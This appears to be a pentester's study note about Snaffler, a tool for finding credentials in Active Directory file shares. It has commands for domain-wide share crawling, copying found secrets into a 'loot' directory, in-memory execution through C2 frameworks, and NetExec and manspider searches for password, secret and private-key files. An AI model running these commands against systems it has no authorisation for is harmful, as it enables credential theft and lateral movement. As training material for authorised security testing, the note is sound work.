# Snaffler

**Tags:** `#snaffler` `#activedirectory` `#fileshare` `#enumeration` `#credentials` `#pillaging` `#postexploitation`

C# tool that finds credentials and sensitive files in accessible network shares and local file systems. Enumerates all domain computers, finds accessible shares, then searches for interesting files based on a ruleset covering hundreds of sensitive file types and patterns (config files, SSH keys, KeePass databases, passwords in plaintext, code with hardcoded creds, etc.). One of the highest-yield tools on internal AD engagements.

**Source:** https://github.com/SnaffCon/Snaffler
**Install:** Download pre-built binary from releases — `Snaffler.exe` and `Snaffler.pdb`

```powershell
# Basic run — enumerate all shares across the domain
.\Snaffler.exe -s -o snaffler.log

# Recommended: run from a domain-joined host with domain user context
.\Snaffler.exe -s -o snaffler.log -v Data
```

> [!note] **Snaffler vs manual share enumeration** — `Find-InterestingDomainShareFile` (PowerView) requires specifying extensions manually and is slow. Snaffler has a curated ruleset covering 300+ file patterns, auto-triage findings by severity, and is significantly faster. Use Snaffler for share pillaging on any AD engagement.

---

> [!warning] **Flag drift — several one-letter flags are easy to get wrong.** `-t` is the log *type* (`plain`/`JSON`), **not** threads (that's `-x`). `-l` is the max file *size* in bytes, **not** "scan local" (a local/UNC path is `-i`). `-y` is TSV output, **not** a rules dir (that's `-p`). `-f` finds shares via DFS. Corrected throughout below.

## Basic Usage

```powershell
# Standard run — domain share enum + file triage, log to file
.\Snaffler.exe -s -o snaffler.log

# -s streams colour-coded results to the console as they're found
.\Snaffler.exe -s -o snaffler.log -v Data

# Verbosity (-v): Trace | Debug | Info (default) | Data
.\Snaffler.exe -s -v Data    # include a snippet of the matching file content (most useful)
.\Snaffler.exe -s -v Info    # default — show what shares are being scanned

# Snaffle ONE directory / UNC path — disables computer AND share discovery (-i)
.\Snaffler.exe -s -i \\server\share -o snaffler.log
.\Snaffler.exe -s -i C:\ -o snaffler.log            # local filesystem

# Give an explicit host list — disables computer discovery only (-n, comma-separated)
.\Snaffler.exe -s -n SERVER01,SERVER02 -o snaffler.log

# Max threads (-x; keep it >= 4 or it breaks)
.\Snaffler.exe -s -x 12 -o snaffler.log
```

---

## Triage Output

Snaffler color-codes and severity-ranks findings automatically:

Snaffler tags each result with a colour token (`{Red}`/`{Yellow}`/`{Green}`/`{Black}`) in the log line — Red is the highest interest, Black the lowest:

| Token | Severity | Examples |
|---|---|---|
| `{Red}` | Critical | Private keys, KeePass databases, passwords in cleartext |
| `{Yellow}` | High | Config files with credentials, web.config, .env, connection strings |
| `{Green}` | Medium | Interesting scripts, backup files, credential-adjacent files |
| `{Black}` | Low | Generic interesting files (Office docs, etc.) |

```powershell
# Parse log for highest severity only
Select-String -Path snaffler.log -Pattern "\{Red\}"

# Filter from console output live
.\Snaffler.exe -s -v Data 2>&1 | Select-String "\{Red\}"
```

---

## File Types Snaffler Targets

Categories from the built-in ruleset:

- **Credentials**: `password`, `passwd`, `credentials`, `secret` in filename
- **Config files**: `web.config`, `appsettings.json`, `.env`, `database.yml`, `wp-config.php`
- **Keys**: `.pem`, `.ppk`, `.pfx`, `.p12`, `.key`, `.ovpn`
- **KeePass**: `.kdbx`, `.kdb`
- **Scripts**: `.ps1`, `.bat`, `.sh`, `.py` — scanned for credential patterns
- **Office docs**: `.docx`, `.xlsx` — scanned for keyword hits
- **Backups**: `.bak`, `.backup`, `.old`, `.orig`
- **SSH**: `id_rsa`, `authorized_keys`, `known_hosts`
- **DB**: `.sql`, `.sqlite`, `.db` dumps

---

## Advanced Options

```powershell
# Max file size to examine, in BYTES (-l; default 10000000 ≈ 10MB)
.\Snaffler.exe -s -l 5242880 -o snaffler.log        # 5MB cap

# Auto-copy every found file into a loot directory (-m)
.\Snaffler.exe -s -m C:\loot\ -o snaffler.log

# Custom .toml rules directory (-p)
.\Snaffler.exe -s -p C:\rules\ -o snaffler.log

# Reduce noise — skip the least-interesting (LAIM) rules; tune 0–3 (-b)
.\Snaffler.exe -s -b 3 -o snaffler.log

# Machine-readable output: TSV (-y) or JSON log type (-t JSON)
.\Snaffler.exe -s -y -o snaffler.tsv
.\Snaffler.exe -s -t JSON -o snaffler.json

# Restrict share discovery to DFS only (-f)
.\Snaffler.exe -s -f -o snaffler.log

# Run as a different user (netonly — creds for the target domain)
runas /netonly /user:DOMAIN\user "Snaffler.exe -s -o snaffler.log"
```

### Recon-only and scoping (often the first, quietest run)

```powershell
# -a : just LIST accessible shares, skip all file enumeration — fast, quiet map of the estate
.\Snaffler.exe -s -a -o shares.log

# -u : pull account names from AD, pick the interesting-looking ones, and add them as a search rule
#      (surfaces files/paths named after admins, service accounts, etc.)
.\Snaffler.exe -s -u -o snaffler.log

# Point at a specific domain / DC instead of auto-detecting (-d domain, -c DC to query)
.\Snaffler.exe -s -d corp.local -c dc01.corp.local -o snaffler.log
```

### Tuning the in-file content search

```powershell
# -r : max bytes to search INSIDE a file for interesting strings (default 500k) — distinct from
#      -l, which caps which files get looked at by size at all
.\Snaffler.exe -s -r 1000000 -o snaffler.log

# -j : bytes of context to show either side of a matched string (wider grep window)
.\Snaffler.exe -s -v Data -j 200 -o snaffler.log
```

### Config file (`-z`) — reproducible, tunable runs

```powershell
# Generate a sample .toml you can edit (rules, share/path denylists, thresholds, output)
.\Snaffler.exe -z generate           # writes .\default.toml
# Then run everything from that config instead of a long flag string
.\Snaffler.exe -z .\myrun.toml
```

---

## Running via C2 / Without Dropping to Disk

```powershell
# Execute-Assembly in Cobalt Strike / Havoc / Sliver
execute-assembly /path/to/Snaffler.exe -s -o snaffler.log

# Or load into memory via PowerShell
$bytes = [System.IO.File]::ReadAllBytes("Snaffler.exe")
$asm = [System.Reflection.Assembly]::Load($bytes)
# Then invoke via reflection
```

> [!note] **No Windows host? (Snaffler is .NET-only.)** Run the equivalent share-crawl + content triage from Linux/Kali:
> ```bash
> # NetExec spider_plus — enumerate + download interesting files across a subnet
> nxc smb 192.168.1.0/24 -u user -p pass -M spider_plus -o READ_ONLY=false
> # MANSPIDER — regex/keyword search inside share files (incl. pdf/docx/xlsx content)
> manspider 192.168.1.0/24 -u user -p pass -c 'password|secret|BEGIN RSA'
> ```
> Neither applies Snaffler's severity-ranked .toml rules, but both cover the "find creds in shares" job when you have no Windows box.

---

## Reviewing Output

```bash
# From Kali — parse log file
grep -i "{Red}" snaffler.log
grep -i "{Yellow}" snaffler.log

# Extract UNC file paths from findings
grep -oP '\\\\[^ ]*' snaffler.log | sort -u

# Count findings by severity
grep -c "{Red}" snaffler.log
grep -c "{Yellow}" snaffler.log
```


> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Windows Priv Esc|Windows Priv Esc]] (CPTS v2) — finding creds and configs on reachable file shares. The slower, manual PowerShell alternative is `Find-InterestingDomainShareFile` in [[Tools/AD/PowerView|PowerView]]; find the shares to point it at with [[Tools/AD/BloodHound|BloodHound]] (`HasSession`/reachable hosts).

---

*Created: 2026-03-06*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
